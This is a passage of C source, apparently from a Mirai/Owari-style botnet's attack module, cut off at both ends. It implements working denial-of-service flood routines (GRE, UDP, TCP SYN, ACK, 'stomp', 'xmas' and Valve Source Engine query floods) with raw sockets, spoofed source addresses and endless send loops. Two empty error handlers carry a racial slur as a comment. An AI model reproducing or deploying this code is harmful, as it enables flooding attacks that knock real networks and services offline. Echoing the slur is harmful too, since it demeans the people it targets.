            ent1 = rand_next();
            ent2 = rand_next();
            ent3 = rand_next();
            util_memcpy(ethh->h_dest, (char *)&ent1, 4);
            util_memcpy(ethh->h_source, (char *)&ent2, 4);
            util_memcpy(ethh->h_dest + 4, (char *)&ent3, 2);
            util_memcpy(ethh->h_source + 4, (((char *)&ent3)) + 2, 2);
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);
            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(65535, sizeof (char));
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);
        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            return;
        }
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;
        if (bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
        {
            //Nigga
        }
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        if (connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in)) == -1)
        {
            //Nigga
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];
            if (data_rand)
                rand_str(data, data_len);
            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}
void attack_method_tcpsyn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, FALSE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        uint8_t *opts;
        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        opts = (uint8_t *)(tcph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 10;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        *opts++ = PROTO_TCP_OPT_MSS;
        *opts++ = 4;
        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
        opts += sizeof (uint16_t);
        *opts++ = PROTO_TCP_OPT_SACK;
        *opts++ = 2;
        *opts++ = PROTO_TCP_OPT_TSVAL;
        *opts++ = 10;
        *((uint32_t *)opts) = rand_next();
        opts += sizeof (uint32_t);
        *((uint32_t *)opts) = 0;
        opts += sizeof (uint32_t);
        *opts++ = 1;
        *opts++ = PROTO_TCP_OPT_WSS;
        *opts++ = 3;
        *opts++ = 6;
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (urg_fl)
                tcph->urg_ptr = rand_next() & 0xffff;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_tcpack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = attack_get_opt_int(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = attack_get_opt_int(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;
        pkts[i] = calloc(1510, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htons(seq);
        tcph->doff = 5;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        tcph->window = rand_next() & 0xffff;
        if (psh_fl)
            tcph->psh = TRUE;
        rand_str(payload, data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (sport == 0xffff)
                tcph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = rand_next() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = rand_next();
            if (ack == 0xffff)
                tcph->ack_seq = rand_next();
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_tcpstomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data));
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(rfd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;
        stomp_setup_nums:
        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
            continue;
        }
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
        addr.sin_family = AF_INET;
        if (targs[i].netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            addr.sin_addr.s_addr = targs[i].addr;
        if (dport == 0xffff)
            addr.sin_port = rand_next() & 0xffff;
        else
            addr.sin_port = htons(dport);
        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        start_recv = time(NULL);
        while (TRUE)
        {
            int ret;
            recv_addr_len = sizeof (struct sockaddr_in);
            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
            {
                return;
            }
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));
                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        struct iphdr *iph;
                        struct tcphdr *tcph;
                        char *payload;
                        stomp_data[i].addr = addr.sin_addr.s_addr;
                        stomp_data[i].seq = ntohl(tcph->seq);
                        stomp_data[i].ack_seq = ntohl(tcph->ack_seq);
                        stomp_data[i].sport = tcph->dest;
                        stomp_data[i].dport = addr.sin_port;
                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph = (struct iphdr *)pkts[i];
                        tcph = (struct tcphdr *)(iph + 1);
                        payload = (char *)(tcph + 1);
                        iph->version = 4;
                        iph->ihl = 5;
                        iph->tos = ip_tos;
                        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph->id = htons(ip_ident);
                        iph->ttl = ip_ttl;
                        if (dont_frag)
                            iph->frag_off = htons(1 << 14);
                        iph->protocol = IPPROTO_TCP;
                        iph->saddr = LOCAL_ADDR;
                        iph->daddr = stomp_data[i].addr;
                        tcph->source = stomp_data[i].sport;
                        tcph->dest = stomp_data[i].dport;
                        tcph->seq = stomp_data[i].ack_seq;
                        tcph->ack_seq = stomp_data[i].seq;
                        tcph->doff = 8;
                        tcph->fin = TRUE;
                        tcph->ack = TRUE;
                        tcph->window = rand_next() & 0xffff;
                        tcph->urg = urg_fl;
                        tcph->ack = ack_fl;
                        tcph->psh = psh_fl;
                        tcph->rst = rst_fl;
                        tcph->syn = syn_fl;
                        tcph->fin = fin_fl;
                        rand_str(payload, data_len);
                        break;
                    }
                    else if (tcph->fin || tcph->rst)
                    {
                        close(fd);
                        goto stomp_setup_nums;
                    }
                }
            }
            if (time(NULL) - start_recv > 10)
            {
                close(fd);
                goto stomp_setup_nums;
            }
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->seq = htons(stomp_data[i].seq++);
            tcph->ack_seq = htons(stomp_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_tcpxmas(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    struct attack_xmas_data *xmas_data = calloc(targs_len, sizeof (struct attack_xmas_data));
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, TRUE);
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, TRUE);
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, TRUE);
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, TRUE);
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, TRUE);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(rfd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;
        xmas_setup_nums:
        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
            continue;
        }
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
        addr.sin_family = AF_INET;
        if (targs[i].netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
        else
            addr.sin_addr.s_addr = targs[i].addr;
        if (dport == 0xffff)
            addr.sin_port = rand_next() & 0xffff;
        else
            addr.sin_port = htons(dport);
        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
        start_recv = time(NULL);
        while (TRUE)
        {
            int ret;
            recv_addr_len = sizeof (struct sockaddr_in);
            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
            {
                return;
            }
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));
                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        struct iphdr *iph;
                        struct tcphdr *tcph;
                        char *payload;
                        xmas_data[i].addr = addr.sin_addr.s_addr;
                        xmas_data[i].seq = ntohl(tcph->seq);
                        xmas_data[i].ack_seq = ntohl(tcph->ack_seq);
                        xmas_data[i].sport = tcph->dest;
                        xmas_data[i].dport = addr.sin_port;
                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph = (struct iphdr *)pkts[i];
                        tcph = (struct tcphdr *)(iph + 1);
                        payload = (char *)(tcph + 1);
                        iph->version = 4;
                        iph->ihl = 5;
                        iph->tos = ip_tos;
                        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
                        iph->id = htons(ip_ident);
                        iph->ttl = ip_ttl;
                        if (dont_frag)
                            iph->frag_off = htons(1 << 14);
                        iph->protocol = IPPROTO_TCP;
                        iph->saddr = LOCAL_ADDR;
                        iph->daddr = xmas_data[i].addr;
                        tcph->source = xmas_data[i].sport;
                        tcph->dest = xmas_data[i].dport;
                        tcph->seq = xmas_data[i].ack_seq;
                        tcph->ack_seq = xmas_data[i].seq;
                        tcph->doff = 8;
                        tcph->fin = TRUE;
                        tcph->ack = TRUE;
                        tcph->window = rand_next() & 0xffff;
                        tcph->urg = urg_fl;
                        tcph->ack = ack_fl;
                        tcph->psh = psh_fl;
                        tcph->rst = rst_fl;
                        tcph->syn = syn_fl;
                        tcph->fin = fin_fl;
                        rand_str(payload, data_len);
                        break;
                    }
                    else if (tcph->fin || tcph->rst)
                    {
                        close(fd);
                        goto xmas_setup_nums;
                    }
                }
            }
            if (time(NULL) - start_recv > 10)
            {
                close(fd);
                goto xmas_setup_nums;
            }
        }
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);
            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            tcph->seq = htons(xmas_data[i].seq++);
            tcph->ack_seq = htons(xmas_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
            targs[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_udpgeneric(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    if (data_len > 1460)
        data_len = 1460;
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        pkts[i] = calloc(1510, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + data_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();
            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();
            if (data_rand)
                rand_str(data, data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + data_len);
            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
    }
}
void attack_method_udpvse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 27015);
    char *vse_payload;
    int vse_payload_len;
    table_unlock_val(OWARI_GABEN);
    vse_payload = table_retrieve_val(OWARI_GABEN, &vse_payload_len);
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;
        pkts[i] = calloc(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = targs[i].addr;
        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof (struct udphdr) + 4 + vse_payload_len);
        *((uint32_t *)data) = 0xffffffff;
        data += sizeof (uint32_t);
        util_memcpy(data, vse_payload, vse_payload_len);
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
            if (ip_ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (sport == 0xffff)
                udph->source = rand_next();
            if (dport == 0xffff)
                udph->dest = rand_next();
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
            targs[i].sock_addr.sin_port = udph->dest;
